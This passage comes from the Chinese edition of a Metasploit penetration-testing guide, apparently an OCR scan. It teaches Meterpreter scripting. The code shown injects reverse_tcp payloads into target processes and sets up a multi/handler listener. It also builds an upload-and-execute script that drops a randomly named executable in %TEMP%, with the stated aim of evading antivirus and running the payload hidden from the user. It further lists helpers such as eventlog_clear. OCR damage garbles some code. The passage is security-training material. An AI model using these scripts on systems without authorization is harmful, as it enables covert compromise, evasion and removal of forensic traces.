when "-h"
usage
when "-p"
lport = val.to_i
when "-m"
start_handler = true
when"-pt"
payload_type = val
when "-mr"
multi_ip =val.split(",")
when "-mp"
multi_pid =val.split(",")
end
{
#Check for Version of Meterpreter
wrong_meter_version(meter_type)if meter_type !~ /win32|win64/i
# Create a Multi Handler is Desired
Create_multi_handler(payload_type)if start_handler
最后，我们进行仔细检查，确保我们的语法是正确的。同时确认我们的新Meterpreter被正
确注入到指定的PID中。
# Check for a PID or program name
if multi_ip
if multi_pid
if multi_ip.length == multi_pid.length
pid_index = 0
multi_ip.each do|il
payload = create_payload(payload_type,i,lport)
inject(multi_pid[pid_index],payload)
select(nil,nil,nil,5)
pid_index=pid_index + 1
end
else
multi_ip.each do |il
payload = create_payload(payload_type,i,lport)
inject(start_proc,payload)
select(nil,nil,nil,2)
end
end
end
240
---
## Page 268
第16章Meterpreter脚本编程
else
print_error("You must provide at least one IP!")
end
16.2
MeterpreterAPI
在渗透测试过程中，你可能无法找到一个正好符合你需求的脚本，来完成想要的任务。
如果你懂得基本的编程概念，就会使你相对轻松地运用Ruby语法来编写出自己想要的脚
本。
作为开始，先介绍在Rubyshell（也称作irb）交互环境中的基本打印命令。在Meterpreter
控制台中，输入irb命令让后开始输入命令：
meterpreter>irb
[*]Starting IRB shell
[*]The'client'variable holds the meterpreter client
>>
16.2.1打印输出
我们以调用print_line(开始，该函数用来打印输出并在最后添加一个结束符。
>> print_line("you have been pwnd!")
you have been pwnd!
=>nil
接下来调用print_statusO，这个函数调用在脚本语言中是最为常见的，它可以用来打印出一
行当前运行状态的提示消息，并以[*]作为前缀。
>> print_status("you have been pwnd!")
[*]you have been pwnd!
=>nil
下一个函数调用是print_goodO，用来提供一次动作执行的结果，并提示这次动作是成功完
成的，以[+]作为前缀。
>> print_good("you have been pwnd")
[+]you have been pwnd
=>nil
241
---
## Page 269
Metasploit渗透测试指南
接下来是print_error(函数，该函数用来提供错误消息或者提示该动作无法成功执行，以[-]
作为前缀。
>> print_error("you have been pwnd!")
[-] you have been pwnd!
=>nil
16.2.2基本API调用
Meterpreter提供了多种API调用，可以在你自己编写的脚本中使用这些API，来提供额外
功能或者定制功能。可以在多个地方找到如何调用这些API的参考代码，脚本编程新手们最常
用的参考代码是Meterpreter控制台用户接口，这些代码可以为作为后续自主撰写脚本的基础。
想查看这些代码，可以在Back-Track中访问Metasploit源码根目录下的
/lib/rex/post/meterpreter/ui/console/command_dispatcher/子目录。如果你仔细查看这个文件夹中的
文件内容，可以从中找到多种命令可供你使用。
root@bt:^# 1s -F /opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/
command_dispatcher/
stdapi/stdapi.rb
在这些脚本的内部是各种Meterpreter核心、用户桌面交互、特权操作，以及其他类型的命
令。阅读这些脚本能够让你了解到Meterpreter是如何在一个攻陷系统中进行运作的。
16.2.3MeterpreterMixins
Meterpretermixins（混入类）是Meterpreter脚本最常使用的一系列函数功能引I用。这些函
数引用在irb环境中是不能使用的，只能在创建Meterpreter脚本时使用。下面是一些最值得推
荐的函数引用列表：
cmd_exec(cmd)：以隐藏和管道化的方式执行给出的命令，命令输出结果以多行字符串方
式显示。
eventlog_clear(evt="")：清除指定的事件日志，如果不指定则清除所有的事件日志记录，
返回一个包含已清除日志的数组。
eventlog_listO：枚举事件日志，并返回一个包含事件日志名称的数组。
file_local_digestsha1(file2sha1)：返回一个指定本地文件的SHA1校验和字符串。
file_local_digestsha2(file2sha2)：返回一个指定本地文件的SHA256校验和字符串。
242
---
## Page 270
第16章Meterpreter脚本编程
file_local_write(file2wrt,data2wrt)：将给定的字符串写入到指定文件中。
is_admin?0：识别当前用户是否为管理员。如果为管理员返回真，若不是返回假。
is_uac_enabled?O：判断用户账户控制（UAC）是否已经开启。
registry_createkey(key)：创建一个给定的注册表键值，如果创建成功返回真。
registry_deleteval(key,valname)：删除一个给定的注册表键值和名字，如果删除成功返回真。
registry_delkey(key)：删除一个给定的注册表键值，如果删除成功返回真。
registry_enumkeys(key)：列举出给定注册表键值的子键，返回一个包含子键的数组。
registry_enumvals(key)：列举出给定的注册表键值的取值，返回含有键值名的数组。
registry_getvaldata(key,valname)：返回给定注册表键值和取值的数据。
registry_getvalinfo(key,valname)：返回给定注册表键值和取值的数据类型。
值，如果成功返回真。
service_change_startup(name,mode)：改变一个指定服务的启动模式，必须提供服务名
称和模式。启动模式是一个代表了自动、手动或者禁用设置的字符串，服务名是大小写敏
感的。
service_create(name,display_name,executable_on_host,startup=2)：该函数用来创建一个
运行自已进程的服务。参数包括：字符串类型的服务名称，字符事类型的显示名称，字符串类
型的自动启动可执行文件路径，数值类型的启动类型（2为自动启动，3为手工启动，4为禁用，
默认为自动启动)。
service_delete(name)：该函数通过删除注册表中的键值来删除服务。
service_info(name)：得到Windows的服务信息。列出的信息有服务名称、启动模式和服务
的启动命令。服务名称是大小写敏感的，哈希值包含了名称、启动模式、命令和证书。
service_listO：列出所有启动的Windows服务，返回包含有服务名的数组。
service_start(name)：启动服务，如果服务启动返回0，如果服务已经启动返回1，若是服
务停止返回2。
service_stop(name)：关闭服务，如果成功关闭服务返回0，如果服务已经禁用或者停止返
回1，如果服务不能停止返回2。
243
---
## Page 271
Metasploit渗透测试指南
如果你想在你定制脚本中加入新的功能，你就需要了解基本的Meterpretermixin函数引用。
16.3编写Meterpreter脚本的规则
当你编写Meterpreter脚本时，特别是在你创建第一个脚本文件，并且想把脚本融入到
Metasploit中之前，你需要了解以下规则。
·只使用临时、本地和常数变量，永远不要使用全局或者类变量，因为他们可能与框架
内的变量相互冲突。
·使用tab键进行缩进，不要使用空格键。
●对程序块来说，不要使用大括号，使用do和end语法模式。
·当声明函数时，养成在声明前进行注释，提供函数用途简要介绍的习惯。
●不要使用sleep函数，使用"select(nil,nil,nil,)"。
●不要使用puts等其他标准的输出函数，使用print,print_line、print_status、print_error、
和print_good 函数。
·总是包含-h选项，该选项将对脚本进行简要的功能说明，并列出所有的命令行选项。
·如果你的脚本需要在特定操作系统或者Meterpreter平台运行，确保他们只能在所支持
的平台上运行，并在不支持的操作系统和平台运行时报错。
16.4创建自己的Meterpreter脚本
在打开你最喜欢的文本编辑器同时，在scripts/meterpreter/文件夹下创建一个名为
execute_upload.rb的脚本文件。我们将把脚本功能描述放在文件顶部，使得所有人都了解这个
脚本的用途，同时定义该脚本的命令行选项。
# Meterpreter script for uploading and executing another meterpreter exe
info = "Simple script for uploading and executing an additional meterpreter payload"
#Options
opts=Rex::Parser::Arguments.new(
0"-h"=>[false,
executing."],
9"-r" => [ true, "The IP of a remote Metasploit listening for the connect back"],
"-p"=>[true，
"The port on the remote host where Metasploit is listening
(default:4444)"]
）
244
---
## Page 272
第16章Meterpreter脚本编程
这个脚本在某种程度上看起来很熟悉，因为这个脚本基本上和本章之前讲述的由Carlos
Perez所写的脚本功能非常类似。脚本帮助信息①使用-h列出、-r和-p用来指定运行新的
Meterpreter可执行程序所需配置的远程IP·和端口号。注意：我们包含了TRUE选项，这表
明这些选项是必需的：
接下来，我们定义在脚本中所使用的变量。我们将调用Rex:Text.rand_text_alpha函数创建
一个唯一的可执行文件名。这样做是非常有效的，因为我们不想静态地去指派一个可执行文件
名，如果这样做可能会给杀毒软件留下一个很明显的识别特征。我们也将配置每个输入参数，
使其或者接受参数赋值，或者打印一些信息，比如-h选项。
filename= Rex::Text.rand_text_alpha((rand(8)+6)) +".exe"
rhost
=Rex::Socket.source_address("1.2.3.4")
rport
=4444
lhost
="127.0.0.1"
pay
=nil
#
# Option parsing
#
opts.parse(args) do lopt, idx, val|
caseopt
when "-h"
print_line(info)
print_line(opts.usage)
raise Rex::Script::Completed
when "-r"
rhost = val0
when "-p"
rport= val.to_io
end
end
注意到我们分别处理了每个参数，获取用户的赋值，或是向用户打印信息。rhost=val●的
含义是“当输入-r时，从用户输入获取取值赋予rhost变量”。rport=val.to_i则简单地将给定
的值解析为一个整型变量赋予rport（对一个端口赋值需要整型变量）。
245
---
## Page 273
Metasploit渗透测试指南
在接下来的步骤中，我们将定义创建攻击载荷所需的全部信息。
payload="windows/meterpreter/reverse_tcp"
 pay = client.framework.payloads.create(payload)
pay.datastore['LHoST']= rhost
mul=client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['wORKSPACE']=client.workspace
mul.datastore['PAYLOAD'] = payload
mul.datastore['EXITFUNC']='process
mul.datastore['ExitonSession']=true
mul.exploit_simple(
'Payload'=>mul.datastore['PAYLOAD']，
'RunAsJob'=> true
）
我们选择了windows/meterpreter/reverse_tcp作为攻击载荷0，通过调用client.framework.
payloads.create函数生成攻击载荷?，并指定了必要的参数来创建--个多句柄监听器。LHOST
和LPORT选项是我们需要用来设置攻击载荷并创建监听器的所有必填配置项。
接下来，我们创建一个可执行文件（Win32PE格式的Meterpreter），上传到目标主机并执行：
0if client.platform=~/win32|win64/
@tempdir = client.fs.file.expand_path("%TEMP%")
print_status("Uploading meterpreter to tempdirectory...")
raw= pay·generate
③exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
tempexe=tempdir+"\\”+filename
tempexe.gsub!("\\1\"，"\\")
fd = client.fs.file.new(tempexe, "wb")
fd.write(exe)
fd.close
print_status("Executing the payload on the system..")
end
在脚本中已经被定义的变量之后将会被调用，注意：我们已经定义了tempdir和filename。在
这个脚本中，我们首先包含了一条语句，用来检测目标系统平台是否是基于Windows的系统?；
如果不是的话，我们的攻击载荷将不会运行。然后我们扩展目标主机的由%TEMP%指定的临时目
录9，并在这创建一个新文件，将我们刚刚调用::Msf:Util:EXE.to_win32pe函数③创建的EXE文
件写入。记得使用session.sys.process.execute进行隐藏，这样目标用户将看不到任何弹出信息框。
综合起来，我们的最终脚本如下所示：
#Meterpreter scriptforuploadingandexecutinganother meterpreter exe
info = “"Simple script for uploading and executing an additional meterpreter payload"
#Options
246
---
## Page 274
第16章Meterpreter脚本编程
opts = Rex::Parser::Arguments.new(